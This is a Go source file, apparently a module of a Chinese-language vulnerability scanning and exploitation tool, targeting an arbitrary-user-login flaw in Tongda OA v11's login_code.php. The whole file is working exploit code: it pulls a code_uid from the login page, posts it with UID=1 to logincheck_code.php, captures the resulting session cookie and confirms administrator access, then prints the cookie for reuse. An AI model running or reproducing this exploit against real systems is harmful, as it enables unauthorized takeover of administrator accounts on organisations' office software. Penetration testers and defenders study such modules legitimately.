package vulners

import (
	"encoding/hex"

	"log"
	"regexp"
	"strings"

	"github.com/fatih/color"
)

type Td05 struct {
}

func (c *Td05) Scan(targetUrl string) {
	vulnerable, err := Td05scancore(targetUrl)
	if err != nil {
		color.Red("[X]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Td05] 存在v11 login_code.php 任意用户登录，请执行Exp模块进行验证")
	} else {
		color.White("[Td05] 不存在v11 login_code.php 任意用户登录")
	}
}

var vulnCookie1 = ""

func (*Td05) Exploit(targetUrl string) {

	runResult, err := Td05runcore(targetUrl)
	if err != nil {
		color.Red("[X]漏洞利用异常！")
		return
	}
	if runResult {
		color.Green("[Td05] 存在v11 login_code.php 任意用户登录\n直接携带下列Cookie并访问 %s/general/index.php \n%s", targetUrl, vulnCookie1)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Td05scancore(targetUrl string) (bool, error) {
	url := "/general/login_code.php"
	resp10, err := baseClient.
		NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent10 := resp10.String()
	hx := hex.EncodeToString([]byte(resContent10))
	tmphx := "60827b22737461747573223a312c22636f64655f756964223a227b"
	if strings.Contains(hx, tmphx) {
		hxIn := strings.LastIndex(hx, "60827b22737461747573223a312c22636f64655f756964223a227b") + 28
		hxLa := strings.Index(hx, "7d227d0d0a0d0a0d0a")
		codeuidHex := hx[hxIn:hxLa]
		hxSt, err := hex.DecodeString(codeuidHex)
		if err != nil {
			log.Fatal(err)
		}
		codeuid1 := string(hxSt)
		if resp10.StatusCode == 200 && strings.Contains(codeuid1, "code_uid") {
			re := regexp.MustCompile(`\w{8}-\w{4}-\w{4}-\w{4}-\w{12}`)
			codeuid2 := re.FindString(codeuid1)
			url2 := "/logincheck_code.php"
			dataDetail1 := "CODEUID={"
			dataDetail2 := "}&UID=1"
			data2 := dataDetail1 + codeuid2 + dataDetail2
			resp9, err := baseClient.
				NewRequest().
				SetHeader("Content-Type", "application/x-www-form-urlencoded").
				SetBodyString(data2).
				Post(targetUrl + url2)
			if err != nil {
				return false, err
			}
			//提交CODEUID
			resContent9 := resp9.String()
			//re := regexp.MustCompile("^[{]+["]+[a-z]{6}["][:][1]")
			match, _ := regexp.MatchString("^[{][\"][a-z]{6}[\"][:][1]", resContent9)
			if resp9.StatusCode == 200 && (match) {

				return true, nil
			} else {
				return false, nil
			}
		} else {
			return false, nil
		}
	}
	return false, nil

}

func Td05runcore(targetUrl string) (bool, error) {
	url := "/general/login_code.php"
	resp10, err := baseClient.
		NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent10 := resp10.String()
	hx := hex.EncodeToString([]byte(resContent10))
	tmphx := "60827b22737461747573223a312c22636f64655f756964223a227b"
	if strings.Contains(hx, tmphx) {
		hxIn := strings.LastIndex(hx, "60827b22737461747573223a312c22636f64655f756964223a227b") + 28
		hxLa := strings.Index(hx, "7d227d0d0a0d0a0d0a")
		codeuidHex := hx[hxIn:hxLa]
		hxSt, err := hex.DecodeString(codeuidHex)
		if err != nil {
			log.Fatal(err)
		}
		codeuid1 := string(hxSt)
		if resp10.StatusCode == 200 && strings.Contains(codeuid1, "code_uid") {
			re := regexp.MustCompile(`\w{8}-\w{4}-\w{4}-\w{4}-\w{12}`)
			codeuid2 := re.FindString(codeuid1)
			url2 := "/logincheck_code.php"
			dataDetail1 := "CODEUID={"
			dataDetail2 := "}&UID=1"
			data2 := dataDetail1 + codeuid2 + dataDetail2
			resp9, err := baseClient.
				NewRequest().
				SetHeader("Content-Type", "application/x-www-form-urlencoded").
				SetBodyString(data2).
				Post(targetUrl + url2)
			if err != nil {
				return false, err
			}
			//提交CODEUID
			resContent9 := resp9.String()
			match, _ := regexp.MatchString("^[{][\"][a-z]{6}[\"][:][1]", resContent9)
			if resp9.StatusCode == 200 && (match) {

				vulnCookie := resp9.GetHeaderValues("Set-Cookie")
				vulnCookie1 = strings.Join(vulnCookie, "")
				url3 := "/general/index.php"
				resp8, err := baseClient.
					NewRequest().
					SetHeader("Cookie", vulnCookie1).
					Post(targetUrl + url3)
				if err != nil {
					return false, err
				}
				resContent8 := resp8.String()
				if resp8.StatusCode == 200 && strings.Contains(resContent8, "uid:1") {
					return true, nil
				} else {
					return false, nil
				}

				//return true, nil
			} else {
				return false, nil
			}
		} else {
			return false, nil
		}
	} else {
		return false, nil
	}

}
